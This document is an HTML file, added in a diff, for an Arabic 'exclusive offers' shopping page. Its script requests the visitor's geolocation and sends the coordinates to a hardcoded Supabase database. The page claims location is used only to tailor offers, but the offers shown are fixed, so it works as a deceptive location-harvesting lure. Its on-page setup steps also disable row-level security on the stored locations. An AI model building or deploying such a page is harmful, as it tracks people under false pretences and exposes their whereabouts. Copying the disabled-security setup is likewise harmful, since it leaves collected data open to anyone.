@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>سنتر الأناقة - عروض حصرية</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #6b1b9a 0%, #7b2cbf 50%, #c2185b 100%);
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* خلفية متحركة */
+    .bg-animation {
+      position: fixed;
+      inset: 0;
+      opacity: 0.2;
+      z-index: 0;
+    }
+
+    .bubble {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(80px);
+      animation: float 8s infinite ease-in-out;
+    }
+
+    .bubble-1 {
+      width: 300px;
+      height: 300px;
+      background: #ec4899;
+      top: 10%;
+      left: 10%;
+      animation-delay: 0s;
+    }
+
+    .bubble-2 {
+      width: 300px;
+      height: 300px;
+      background: #9333ea;
+      bottom: 10%;
+      right: 10%;
+      animation-delay: 1s;
+    }
+
+    .bubble-3 {
+      width: 300px;
+      height: 300px;
+      background: #6366f1;
+      top: 50%;
+      left: 50%;
+      animation-delay: 0.5s;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      50% { transform: translate(30px, -30px) scale(1.1); }
+    }
+
+    /* الحاوية الرئيسية */
+    .container {
+      position: relative;
+      z-index: 10;
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* الشاشة الرئيسية */
+    .home-screen {
+      text-align: center;
+      width: 100%;
+    }
+
+    /* الشعار */
+    .logo {
+      margin-bottom: 30px;
+      position: relative;
+      display: inline-block;
+    }
+
+    .logo-icon {
+      width: 100px;
+      height: 100px;
+      animation: rotate 8s linear infinite;
+    }
+
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .logo-glow {
+      position: absolute;
+      inset: -20px;
+      background: linear-gradient(45deg, #ec4899, #9333ea);
+      border-radius: 50%;
+      filter: blur(40px);
+      opacity: 0.5;
+      z-index: -1;
+    }
+
+    /* العنوان */
+    h1 {
+      font-size: 4rem;
+      font-weight: bold;
+      background: linear-gradient(90deg, #fce7f3, #e9d5ff, #ddd6fe);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 20px;
+      animation: gradient 3s ease infinite;
+      background-size: 200% 200%;
+    }
+
+    @keyframes gradient {
+      0%, 100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+    }
+
+    .subtitle {
+      font-size: 1.5rem;
+      color: #e9d5ff;
+      margin-bottom: 50px;
+      font-weight: 300;
+    }
+
+    /* البطاقة الرئيسية */
+    .main-card {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(20px);
+      border-radius: 30px;
+      padding: 60px 40px;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      transition: transform 0.3s ease;
+      margin-bottom: 30px;
+    }
+
+    .main-card:hover {
+      transform: scale(1.02);
+    }
+
+    .card-icon {
+      width: 70px;
+      height: 70px;
+      margin: 0 auto 30px;
+      color: #fbb6ce;
+    }
+
+    h2 {
+      font-size: 2rem;
+      color: white;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    .description {
+      color: #e9d5ff;
+      font-size: 1.2rem;
+      margin-bottom: 30px;
+      line-height: 1.6;
+    }
+
+    /* الأزرار */
+    .btn {
+      width: 100%;
+      background: linear-gradient(90deg, #ec4899, #9333ea);
+      color: white;
+      font-size: 1.3rem;
+      font-weight: bold;
+      padding: 20px 40px;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 10px 30px rgba(236, 72, 153, 0.4);
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+    }
+
+    .btn:hover:not(:disabled) {
+      transform: scale(1.05);
+      box-shadow: 0 15px 40px rgba(236, 72, 153, 0.6);
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .btn-icon {
+      width: 24px;
+      height: 24px;
+    }
+
+    .spinner {
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .note {
+      color: #e9d5ff;
+      font-size: 0.9rem;
+      margin-top: 20px;
+    }
+
+    /* رسائل التنبيه */
+    .alert {
+      padding: 15px 20px;
+      border-radius: 15px;
+      margin-bottom: 20px;
+      border: 1px solid;
+    }
+
+    .alert-error {
+      background: rgba(239, 68, 68, 0.2);
+      border-color: #fca5a5;
+      color: #fee2e2;
+    }
+
+    .alert-success {
+      background: rgba(34, 197, 94, 0.2);
+      border-color: #86efac;
+      color: #dcfce7;
+    }
+
+    /* صندوق التعليمات */
+    .instructions {
+      background: rgba(234, 179, 8, 0.1);
+      border: 1px solid rgba(250, 204, 21, 0.3);
+      border-radius: 20px;
+      padding: 30px;
+      text-align: right;
+      color: #fef3c7;
+    }
+
+    .instructions h3 {
+      color: #fde68a;
+      font-size: 1.3rem;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    .instructions ol {
+      list-style-position: inside;
+      line-height: 2;
+      font-size: 0.95rem;
+    }
+
+    .instructions ul {
+      margin-right: 40px;
+      margin-top: 10px;
+      list-style: disc;
+    }
+
+    .instructions li {
+      margin-bottom: 10px;
+    }
+
+    /* شاشة العروض */
+    .offers-screen {
+      display: none;
+      text-align: center;
+      width: 100%;
+      animation: fadeIn 0.6s ease;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .success-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #10b981, #059669);
+      border-radius: 50%;
+      margin: 0 auto 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .checkmark {
+      width: 50px;
+      height: 50px;
+      color: white;
+    }
+
+    .coordinates {
+      background: rgba(88, 28, 135, 0.3);
+      border-radius: 15px;
+      padding: 20px;
+      color: #e9d5ff;
+      margin: 20px 0;
+      font-family: monospace;
+      font-size: 0.85rem;
+    }
+
+    .offers-title {
+      font-size: 2rem;
+      color: #fbb6ce;
+      margin: 30px 0 20px;
+      font-weight: bold;
+    }
+
+    .offer-card {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 15px;
+      padding: 20px;
+      margin-bottom: 15px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: all 0.3s ease;
+      cursor: pointer;
+    }
+
+    .offer-card:hover {
+      background: rgba(255, 255, 255, 0.2);
+      transform: translateX(-5px);
+    }
+
+    .offer-title {
+      color: white;
+      font-weight: 600;
+      font-size: 1.1rem;
+    }
+
+    .offer-badge {
+      background: linear-gradient(90deg, #ec4899, #9333ea);
+      color: white;
+      padding: 8px 20px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: bold;
+    }
+
+    .back-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      color: #e9d5ff;
+      font-size: 1rem;
+      margin-top: 30px;
+      cursor: pointer;
+      transition: color 0.3s ease;
+      background: none;
+      border: none;
+      padding: 0;
+    }
+
+    .back-btn:hover {
+      color: white;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    @media (max-width: 768px) {
+      h1 { font-size: 2.5rem; }
+      .subtitle { font-size: 1.2rem; }
+      h2 { font-size: 1.5rem; }
+      .main-card { padding: 40px 20px; }
+      .instructions { padding: 20px; }
+    }
+  </style>
+</head>
+<body>
+  <!-- خلفية متحركة -->
+  <div class="bg-animation">
+    <div class="bubble bubble-1"></div>
+    <div class="bubble bubble-2"></div>
+    <div class="bubble bubble-3"></div>
+  </div>
+
+  <div class="container">
+    <!-- الشاشة الرئيسية -->
+    <div id="homeScreen" class="home-screen">
+      <!-- الشعار -->
+      <div class="logo">
+        <div class="logo-glow"></div>
+        <svg class="logo-icon" viewBox="0 0 24 24" fill="none" stroke="#fbb6ce" stroke-width="2">
+          <path d="M12 2L2 7L12 12L22 7L12 2Z"/>
+          <path d="M2 17L12 22L22 17"/>
+          <path d="M2 12L12 17L22 12"/>
+        </svg>
+      </div>
+
+      <!-- العنوان -->
+      <h1>سنتر الأناقة</h1>
+      <p class="subtitle">عروض حصرية في منطقتك</p>
+
+      <!-- البطاقة الرئيسية -->
+      <div class="main-card">
+        <svg class="card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M21 10C21 17 12 23 12 23S3 17 3 10C3 5 7 2 12 2S21 5 21 10Z"/>
+          <circle cx="12" cy="10" r="3"/>
+        </svg>
+
+        <h2>اكتشف أفضل العروض بالقرب منك</h2>
+        <p class="description">حدد موقعك الآن للحصول على عروض مخصصة وحصرية</p>
+
+        <div id="errorMessage" class="alert alert-error hidden"></div>
+
+        <button id="locationBtn" class="btn" onclick="getLocation()">
+          <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M21 10C21 17 12 23 12 23S3 17 3 10C3 5 7 2 12 2S21 5 21 10Z"/>
+            <circle cx="12" cy="10" r="3"/>
+          </svg>
+          اضغط لتحديد العروض
+        </button>
+
+        <p class="note">سنستخدم موقعك فقط لعرض العروض المناسبة</p>
+      </div>
+
+      <!-- تعليمات الإعداد -->
+      <div class="instructions">
+        <h3>📝 تعليمات إعداد Supabase:</h3>
+        <ol>
+          <li><strong>إنشاء المشروع:</strong> اذهب إلى supabase.com وأنشئ مشروع جديد</li>
+          <li><strong>إنشاء الجدول:</strong> في SQL Editor، انسخ والصق:
+            <ul>
+              <li>CREATE TABLE locations (</li>
+              <li>&nbsp;&nbsp;id BIGSERIAL PRIMARY KEY,</li>
+              <li>&nbsp;&nbsp;latitude FLOAT8 NOT NULL,</li>
+              <li>&nbsp;&nbsp;longitude FLOAT8 NOT NULL,</li>
+              <li>&nbsp;&nbsp;created_at TIMESTAMPTZ DEFAULT NOW()</li>
+              <li>);</li>
+            </ul>
+          </li>
+          <li><strong>تعطيل الحماية:</strong> نفذ هذا الأمر:
+            <ul>
+              <li>ALTER TABLE locations DISABLE ROW LEVEL SECURITY;</li>
+            </ul>
+          </li>
+          <li><strong>نسخ المفاتيح:</strong> من Settings → API، انسخ:
+            <ul>
+              <li>Project URL</li>
+              <li>anon public key</li>
+            </ul>
+          </li>
+          <li><strong>تحديث الكود:</strong> استبدل المفاتيح في السطر 295-296 أدناه</li>
+        </ol>
+      </div>
+    </div>
+
+    <!-- شاشة العروض -->
+    <div id="offersScreen" class="offers-screen">
+      <div class="main-card">
+        <div class="success-icon">
+          <svg class="checkmark" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+            <path d="M5 13L9 17L19 7"/>
+          </svg>
+        </div>
+
+        <h2>تم حفظ موقعك بنجاح!</h2>
+
+        <div id="coordinatesBox" class="coordinates"></div>
+
+        <h3 class="offers-title">العروض الحصرية في منطقتك</h3>
+
+        <div class="offer-card">
+          <span class="offer-title">خصم 50٪ على الأزياء الصيفية</span>
+          <span class="offer-badge">جديد</span>
+        </div>
+
+        <div class="offer-card">
+          <span class="offer-title">عرض 2+1 على الإكسسوارات</span>
+          <span class="offer-badge">رائج</span>
+        </div>
+
+        <div class="offer-card">
+          <span class="offer-title">تخفيضات نهاية الموسم</span>
+          <span class="offer-badge">حصري</span>
+        </div>
+
+        <button class="back-btn" onclick="goBack()">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M15 18L9 12L15 6"/>
+          </svg>
+          العودة للرئيسية
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ⚠️ استبدل هذه القيم بمعلومات مشروعك في Supabase
+    const SUPABASE_URL = 'https://ewlchxwkkrqzxqtcozcb.supabase.co';  // مثال: https://xxxxx.supabase.co
+    const SUPABASE_ANON_KEY = 'sb_publishable_yJrOAbs5FjjjBm7rTebFSA_2vhwbGD8';
+
+    let currentLocation = null;
+
+    function getLocation() {
+      const btn = document.getElementById('locationBtn');
+      const errorMsg = document.getElementById('errorMessage');
+      
+      // إخفاء أي رسالة خطأ سابقة
+      errorMsg.classList.add('hidden');
+      
+      // تعطيل الزر وإظهار التحميل
+      btn.disabled = true;
+      btn.innerHTML = `
+        <div class="spinner"></div>
+        جاري تحديد الموقع...
+      `;
+
+      // التحقق من دعم المتصفح
+      if (!navigator.geolocation) {
+        showError('المتصفح لا يدعم تحديد الموقع');
+        resetButton();
+        return;
+      }
+
+      // الحصول على الموقع
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          currentLocation = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          };
+
+          // حفظ الموقع في Supabase
+          try {
+            const response = await fetch(`${SUPABASE_URL}/rest/v1/locations`, {
+              method: 'POST',
+              headers: {
+                'apikey': SUPABASE_ANON_KEY,
+                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                'Content-Type': 'application/json',
+                'Prefer': 'return=minimal'
+              },
+              body: JSON.stringify({
+                latitude: currentLocation.latitude,
+                longitude: currentLocation.longitude,
+                created_at: new Date().toISOString()
+              })
+            });
+
+            if (response.ok) {
+              // نجح الحفظ - الانتقال لشاشة العروض
+              showOffers();
+            } else {
+              showError('حدث خطأ في حفظ الموقع. تأكد من إعدادات Supabase والمفاتيح');
+              resetButton();
+            }
+          } catch (error) {
+            showError('تأكد من إدخال معلومات Supabase الصحيحة في الكود');
+            console.error('خطأ:', error);
+            resetButton();
+          }
+        },
+        (error) => {
+          let message = 'فشل الحصول على الموقع';
+          
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              message = 'يرجى السماح بالوصول للموقع من إعدادات المتصفح';
+              break;
+            case error.POSITION_UNAVAILABLE:
+  message =
+    'معلومات الموقع غير متاحة حالياً.\n' +
+    'جرّب التالي:\n' +
+    '1) فعّل Location في ويندوز.\n' +
+    '2) اسمح Location للموقع من إعدادات المتصفح.\n' +
+    '3) جرّب Wi-Fi بدل hotspot.\n' +
+    '4) جرّب من هاتفك.';
+  break;
+            case error.TIMEOUT:
+              message = 'انتهت مهلة طلب الموقع. حاول مرة أخرى';
+              break;
+          }
+          
+          showError(message);
+          resetButton();
+        }
+      );
+    }
+
+    function showError(message) {
+      const errorMsg = document.getElementById('errorMessage');
+      errorMsg.textContent = message;
+      errorMsg.classList.remove('hidden');
+    }
+
+    function resetButton() {
+      const btn = document.getElementById('locationBtn');
+      btn.disabled = false;
+      btn.innerHTML = `
+        <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M21 10C21 17 12 23 12 23S3 17 3 10C3 5 7 2 12 2S21 5 21 10Z"/>
+          <circle cx="12" cy="10" r="3"/>
+        </svg>
+        اضغط لتحديد العروض
+      `;
+    }
+
+    function showOffers() {
+      // إخفاء الشاشة الرئيسية
+      document.getElementById('homeScreen').style.display = 'none';
+      
+      // عرض شاشة العروض
+      document.getElementById('offersScreen').style.display = 'block';
+      
+      // عرض الإحداثيات
+      if (currentLocation) {
+        document.getElementById('coordinatesBox').innerHTML = `
+          <p style="margin-bottom: 10px;">إحداثيات الموقع:</p>
+          <div>Latitude: ${currentLocation.latitude.toFixed(6)}</div>
+          <div>Longitude: ${currentLocation.longitude.toFixed(6)}</div>
+        `;
+      }
+    }
+
+    function goBack() {
+      // إخفاء شاشة العروض
+      document.getElementById('offersScreen').style.display = 'none';
+      
+      // عرض الشاشة الرئيسية
+      document.getElementById('homeScreen').style.display = 'block';
+      
+      // إعادة تعيين
+      currentLocation = null;
+      resetButton();
+    }
+  </script>
+</body>
+</html>
